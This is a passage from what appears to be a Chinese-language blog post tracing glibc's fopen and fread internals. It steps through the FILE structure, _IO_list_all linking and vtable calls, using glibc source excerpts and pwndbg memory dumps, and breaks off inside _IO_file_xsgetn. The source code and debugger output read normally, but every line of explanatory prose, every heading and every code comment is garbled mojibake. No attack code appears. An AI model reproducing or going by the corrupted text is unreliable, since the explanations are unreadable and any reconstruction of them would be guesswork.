‡å¿—ï¼Œå¦‚æœä¸åŒ…å«åˆ™è¡¨ç¤ºè¿™ä¸ªç»“æ„ä½“æ²¡æœ‰é“¾æ¥è¿›<code>_IO_list_all</code>ï¼Œä¹‹åä¼šå°†å®ƒé“¾æ¥è¿›<code>_IO_list_all</code>é“¾è¡¨ï¼ŒåŒæ—¶è®¾ç½®<code>_chain</code>ä¸ºä¹‹å‰çš„é“¾è¡¨çš„å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print _IO_list_all</span><br><span class="line">$10 = (struct _IO_FILE_plus *) 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;</span><br><span class="line">pwndbg&gt; print _IO_list_all</span><br><span class="line">$11 = (struct _IO_FILE_plus *) 0x602010</span><br><span class="line">pwndbg&gt; print *fp</span><br><span class="line">$12 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72538996, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰æ‰§è¡Œ<code>_IO_file_init</code>çš„æ—¶å€™æŒ‡å‘<code>stderr</code>ç»“æ„ä½“ï¼Œæ‰§è¡ŒåæŒ‡å‘ç”³è¯·å‡ºæ¥çš„ç»“æ„ä½“ã€‚</p><p>å¹¶ä¸”<code>_chain</code>æŒ‡å‘<code>stderr</code>ç»“æ„ä½“ã€‚</p><h3 id="step4-IO-file-fopenæ‰“å¼€æ–‡ä»¶å¥æŸ„"><a href="#step4-IO-file-fopenæ‰“å¼€æ–‡ä»¶å¥æŸ„" class="headerlink" title="step4:_IO_file_fopenæ‰“å¼€æ–‡ä»¶å¥æŸ„"></a>step4:_IO_file_fopenæ‰“å¼€æ–‡ä»¶å¥æŸ„</h3><p>ä¹‹åå›åˆ°ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE * _IO_new_file_fopen (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="keyword">int</span> read_write;</span><br><span class="line">  <span class="keyword">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  _IO_FILE *result;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *cs;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *last_recognized;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">//æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²æ‰“å¼€</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//è®¾ç½®æ‰“å¼€æ¨¡å¼</span></span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//è°ƒç”¨_IO_file_open</span></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">  is32not64);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_fopen, _IO_file_fopen)</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥æ˜¯å¦æ‰“å¼€ï¼Œä¹‹åè®¾ç½®æ‰“å¼€æ¨¡å¼ï¼Œç„¶åè°ƒç”¨<code>_IO_file_open</code>ç»§ç»­è·Ÿè¿›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_file_open (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> posix_mode, <span class="keyword">int</span> prot,</span><br><span class="line">       <span class="keyword">int</span> read_write, <span class="keyword">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = open_not_cancel (filename,</span><br><span class="line">     posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">//è°ƒç”¨ç³»ç»Ÿå‡½æ•°openæ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">//å°†æ–‡ä»¶æè¿°ç¬¦å†™åˆ°_filenoå­—æ®µé‡Œ</span></span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">&#123;</span><br><span class="line">  close_not_cancel (fdesc);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//è°ƒç”¨_IO_link_in</span></span><br><span class="line">  _IO_link_in ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_open)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œåå¯ä»¥çœ‹åˆ°<code>_fileno</code>å·²ç»è¢«è®¾ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> new_f-&gt;fp</span></span><br><span class="line"><span class="meta">$</span><span class="bash">17 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = 3, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>fopençš„æµç¨‹ï¼š</p><blockquote><ol><li> malloc</li><li> <code>_IO_no_init</code>åˆå§‹åŒ–</li><li> <code>_IO_file_init</code>å°†ç»“æ„ä½“é“¾æ¥è¿›<code>_IO_list_all</code>é“¾è¡¨</li><li> <code>_IO_file_fopen</code>è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶</li></ol></blockquote><p>æ•´ä¸ªæµç¨‹è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œfopenè¿”å›ä¹‹å<code>_IO_list_all</code>é“¾è¡¨æŒ‡å‘è¿”å›çš„FILEç»“æ„ä½“ï¼Œä¸”FILEç»“æ„ä½“çš„_chainå­—æ®µæŒ‡å‘ä¹‹å‰çš„ç»“æ„ä½“ï¼ˆæ²¡æœ‰å…¶ä»–é¢å¤–æ‰“å¼€æ–‡ä»¶çš„è¯ï¼Œå°†æ˜¯æŒ‡å‘<code>stderr</code>ï¼‰ï¼ŒåŒæ—¶å…¶ä»–çš„å­—æ®µå¤§å¤šéƒ½æ˜¯é»˜è®¤çš„nullå€¼ï¼Œ<code>vtable</code>å­˜å‚¨çš„æ˜¯<code>__GI__IO_file_jumps</code>å‡½æ•°è¡¨ï¼Œ</p><h1 id="IO-FILEä¹‹freadè¯¦è§£"><a href="#IO-FILEä¹‹freadè¯¦è§£" class="headerlink" title="IO_FILEä¹‹freadè¯¦è§£"></a>IO_FILEä¹‹freadè¯¦è§£</h1><p>ä¸Šé¢å†™äº†fopençš„åˆ†æï¼Œè®²äº†ç³»ç»Ÿæ˜¯å¦‚ä½•ä¸ºFILEç»“æ„ä½“åˆ†é…å†…å­˜å¹¶å°†å…¶é“¾æ¥è¿›<code>_IO_list_all</code>ä¸­çš„ã€‚</p><p>æœ¬æ¬¡æ¥è®²freadï¼Œå®ç°ä»æ–‡ä»¶è¯»æ•°æ®ã€‚ä¸‹é¢æ˜¯æœ¬æ¬¡freadçš„æµç¨‹å›¾ï¼š</p><p><img src="/2021/09/24/IO_FILE/image-20210925232855099.png" alt="image-20210925232855099"></p><p>freadçš„å¤§è‡´æµç¨‹ï¼š</p><p>freadè°ƒç”¨<code>_IO_sgetn</code>ï¼Œä¹‹å<code>_IO_sgetn</code>è°ƒç”¨vtableä¸­çš„<code>_IO_XSGETN</code>ä¹Ÿå°±æ˜¯</p><p><code>_IO_file_xsgetn</code>ï¼Œè¿™ä¸ªæ˜¯freadçš„æ ¸å¿ƒï¼Œç®€å•æµç¨‹ï¼š</p><ol><li> åˆ¤æ–­<code>fp-&gt;_IO_buf_base</code>è¾“å…¥ç¼“å†²åŒº æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™è°ƒç”¨<code>_IO_doallocbuf</code>åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº</li><li> åˆ†é…å®Œè¾“å…¥ç¼“å†²åŒºæˆ–è€…è¾“å…¥ç¼“å†²åŒºä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œåˆ¤æ–­è¾“å…¥ç¼“å†²åŒºä¸­æ˜¯å¦æœ‰æ•°æ®</li><li> å¦‚æœæœ‰æ•°æ®ï¼Œç›´æ¥æ‹·è´åˆ°ç”¨æˆ·ç¼“å†²åŒºï¼Œå¦‚æœæ²¡æœ‰æˆ–ä¸å¤Ÿåˆ™è°ƒç”¨<code>__underflow</code>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®åˆ°è¾“å…¥ç¼“å†²åŒºï¼Œå†æ‹·è´åˆ°ç”¨æˆ·ç¼“å†²åŒº</li></ol><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">20</span>];</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>è¿›åˆ°freadï¼Œçœ‹åˆ°è°ƒç”¨äº†<code>_IO_fread</code></p><p>å…ˆçœ‹ä¸‹FILEç»“æ„ä½“çš„fpå†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°<code>_IO_read_ptr</code>ã€<code>_IO_buf_base</code>ç­‰è¿˜æ˜¯ç©ºçš„ï¼Œåé¢çš„åˆ†æçš„é‡è¦çš„æ­¥éª¤ä¹Ÿæ˜¯çœ‹è¿™äº›æŒ‡é’ˆå¦‚ä½•è¢«èµ‹å€¼ä»¥åŠå‘æŒ¥ä½œç”¨çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> *_IO_list_all</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = 3, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> *_IO_list_all-&gt;vtable</span></span><br><span class="line"><span class="meta">$</span><span class="bash">3 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x7ffff7a869d0 &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = 0x7ffff7a87740 &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = 0x7ffff7a874b0 &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = 0x7ffff7a88610 &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = 0x7ffff7a89990 &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = 0x7ffff7a861f0 &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = 0x7ffff7a85ed0 &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = 0x7ffff7a854d0 &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = 0x7ffff7a88a10 &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = 0x7ffff7a85440 &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = 0x7ffff7a85380 &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = 0x7ffff7a7a190 &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = 0x7ffff7a861b0 &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = 0x7ffff7a85b80 &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = 0x7ffff7a85980 &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = 0x7ffff7a85350 &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = 0x7ffff7a85b70 &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = 0x7ffff7a89b00 &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = 0x7ffff7a89b10 &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>freadçš„è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (<span class="keyword">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t bytes_requested = size * count;</span><br><span class="line">  _IO_size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//è°ƒç”¨_IO_sgetnå‡½æ•°</span></span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="keyword">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fread)</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>_IO_sgetn</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (_IO_FILE *fp, <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_sgetn)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»–çš„è°ƒç”¨æ˜¯<code>_IO_XSGETN</code>å‡½æ•°ï¼Œå®ƒçš„å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure><p>å®é™…å°±æ˜¯è°ƒç”¨äº†vtableä¸­çš„<code>__xsgetn</code>å‡½æ•°ï¼Œç»§ç»­è·Ÿï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t want, have;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="keyword">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">  ....</span><br><span class="line">      <span class="comment">//step1ï¼šå¦‚æœfp-&gt;_IO_buf_base == NULLï¼Œè°ƒç”¨_IO_doallocbuf</span></span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    